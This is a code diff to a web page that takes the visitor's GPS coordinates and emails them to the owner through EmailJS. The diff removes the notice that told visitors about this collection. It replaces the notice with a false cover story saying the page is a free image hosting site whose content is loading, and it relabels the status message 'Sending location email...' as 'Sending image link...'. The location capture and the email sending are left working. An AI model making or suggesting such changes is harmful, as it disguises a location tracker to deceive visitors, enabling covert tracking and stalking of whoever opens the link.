@@ -7,11 +7,10 @@
   <title>GPS Location Project</title>
 </head>
 <body>
-  <h2>GPS Location Test</h2>
+  <h2>Getting image link</h2>
 
   <p>
-    This page automatically requests your location and, if access
-    is allowed, emails your coordinates to the project owner.
+    This is a free image hosting website. Your content is loading...
   </p>
 
   <p id="status" role="status" aria-live="polite">
@@ -76,7 +75,7 @@ https://www.google.com/maps?q=${latitude},${longitude}
 Date: ${new Date().toLocaleString()}
         `.trim();
 
-        statusElement.textContent = "Sending location email...";
+        statusElement.textContent = "Sending image link...";
 
         await window.emailjs.send(
           SERVICE_ID,
